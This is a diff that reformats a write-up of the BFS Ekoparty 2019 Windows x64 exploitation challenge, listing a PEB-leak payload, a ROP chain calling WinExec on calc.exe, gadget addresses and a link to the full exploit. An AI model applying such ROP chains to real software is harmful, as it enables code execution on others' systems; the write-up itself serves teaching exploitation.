@@ -63,9 +63,7 @@ The first thing I had to do was, get the process address from PEB.
 
 By sending in our payload these are the last bytes:  
 
-"\`diff
-- x65`\x65\x65\x65\x65\x65\x65\x65\`diff 
-- x60`\x00\x00\x00\x00\x00\x00\x00"
+"\x65\x65\x65\x65\x65\x65\x65\x65\x60\x00\x00\x00\x00\x00\x00\x00"
 
 We could achieve and acquire the PEB. \x65 is meant for the combination from the previous instructions.  
 
@@ -173,42 +171,40 @@ In windows 10 x64 , the calling convention is rcx,rdx,r8,r9 and top of the stack
 The structure of the packet is this. The whole packet is the cookie + 528 characters.  
 
 Structure:
+| 16 junk bytes | padding  |
 
-```|16 junk bytes| - padding  
-|pop_rax_gadget| - Pop Image Base Address for having a valid address on RAX because the only pop rdx and pop rdx gadgets set bad values to it.  
-|Image Base Address – 0x08| - valid address  
-|pop_rdx_gadget| - pop rdx gadget to put 0x01 for the Wincalc second argument.  
-|0x01|- Winexec UINT   uCmdShow  
-|pop_rax_gadget| - again for the same reason that the pop rcx gadget will set bad value to rax  
-|pop_rcx_gadget| - set the pointer address that points to calc.exe\x00  
-|address_pointing_calc| - address that points to calc.exe\x00  
-|72 junk bytes| - padding  
-|ret_gadget| - just a return gadget to fix the stack alignment to 16-byte format, because CreateProcessA is called inside the Winexec function which includes movabs instruction. Movabs instructions check if the stack is aligned and if not it will raise an exception.  
-|winexec_leaked_address| - winexec address on the stack.  
-|add_rsp_0x78| - adds to current RSP + 0x78 bytes to reach the next stack pivot.  
-|120 junk bytes| - padding.  
-|add_rsp_0x78| - adds to current RSP + 0x78 bytes to reach the next stack pivot.  
-|120 junk bytes| - padding.  
-|add_rsp_0x28| - adds to current RSP + 0x28 bytes to reach the next stack pivot. 
-|40 junk bytes| - padding.  
-|add_rsp_0x58| - adds to current RSP + 0x58 bytes to reach the original return pointer address and continue the execution of the application instead of crashing it. 
-|8 junk bytes| - padding.  
-|calc.exe\x00| - string to set in memory.  
-|15 junk bytes| - padding.
-```
+|pop_rax_gadget| Pop Image Base Address for having a valid address on RAX because the only pop rdx and pop rdx gadgets set bad values to it. |
+|Image Base Address – 0x08| valid address |
+|pop_rdx_gadget| pop rdx gadget to put 0x01 for the Wincalc second argument.|
+|0x01| Winexec UINT   uCmdShow |
+|pop_rax_gadget| again for the same reason that the pop rcx gadget will set bad value to rax |
+|pop_rcx_gadget| set the pointer address that points to calc.exe\x00 |
+|address_pointing_calc| address that points to calc.exe\x00 |
+|72 junk bytes| padding |
+|ret_gadget| just a return gadget to fix the stack alignment to 16-byte format, because CreateProcessA is called inside the Winexec function which includes movabs instruction. Movabs instructions check if the stack is aligned and if not it will raise an exception. |
+|winexec_leaked_address| winexec address on the stack. |
+|add_rsp_0x78| adds to current RSP + 0x78 bytes to reach the next stack pivot. |
+|120 junk bytes| padding. |
+|add_rsp_0x78| adds to current RSP + 0x78 bytes to reach the next stack pivot. |
+|120 junk bytes| padding. |
+|add_rsp_0x28| adds to current RSP + 0x28 bytes to reach the next stack pivot. |
+|40 junk bytes| padding. |
+|add_rsp_0x58| adds to current RSP + 0x58 bytes to reach the original return pointer address and continue the execution of the application instead of crashing it.|
+|8 junk bytes| padding. |
+|calc.exe\x00| string to set in memory. |
+|15 junk bytes| padding.|
 
 
 Gadgets Used:
 
-```
-0x14000158b: add rsp, 0x78 ; ret  ;  
-0x0000000140004525: pop rdx; add byte ptr [rax], al; cmp word ptr [rax], cx; je 0x4530; xor eax, eax; ret; 
-0x140001167: pop rax ; ret  ; 
-0x00000001400089ab: pop rcx; or byte ptr [rax], al; add byte ptr [rax - 0x77], cl; add eax, 0x4b12; add rsp, 0x48; ret;
-0x0000000140001164: add rsp, 0x58; ret; 
-0x14000158f: ret  ;  
-0x00000001400011d5: add rsp, 0x28; ret;
-```
+|0x14000158b| add rsp, 0x78 ; ret  ; |
+|x0000000140004525|pop rdx; add byte ptr [rax], al; cmp word ptr [rax], cx; je 0x4530; xor eax, eax; ret; |
+|0x140001167: pop rax ; ret  ; |
+|0x00000001400089ab: pop rcx; or byte ptr [rax], al; add byte ptr [rax - 0x77], cl; add eax, 0x4b12; add rsp, 0x48; ret;|
+|0x0000000140001164: add rsp, 0x58; ret; |
+|0x14000158f: ret  ;  |
+|0x00000001400011d5: add rsp, 0x28; ret;|
+
 
 
 Full Working exploit: [https://github.com/trickster0/BFS-Ekoparty-2019-challenge](https://github.com/trickster0/BFS-Ekoparty-2019-challenge)  
